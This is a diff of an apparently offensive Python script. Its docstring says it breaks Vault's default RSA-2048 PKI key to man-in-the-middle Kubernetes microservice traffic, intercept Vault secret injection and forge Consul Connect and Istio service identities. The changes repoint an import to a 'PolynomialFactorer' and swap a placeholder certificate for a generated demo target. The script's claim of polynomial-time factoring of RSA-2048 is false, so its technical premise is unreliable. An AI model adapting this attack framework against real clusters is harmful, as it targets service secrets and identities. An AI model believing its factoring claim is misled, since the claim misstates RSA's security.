@@ -4,8 +4,10 @@ RSA-2048 key (the default). MitM every microservice API call in Kubernetes, inte
 Vault secret injection, compromise Consul Connect and Istio service identity.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import json
 import hashlib
@@ -40,7 +42,7 @@ def extract_vault_root_ca(vault_addr: str) -> bytes:
     print(f"[*] fetching Vault PKI root CA from {vault_addr}/v1/pki/ca/pem")
     print(f"[*] RSA-{VAULT_PKI_DEFAULT_KEY_BITS}, {VAULT_PKI_DEFAULT_TTL} TTL (default)")
     print("[*] unauthenticated endpoint — no Vault token needed")
-    return b"-----BEGIN CERTIFICATE-----\n...(Vault root CA)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_service_cert(factorer: PolynomialFactorer,
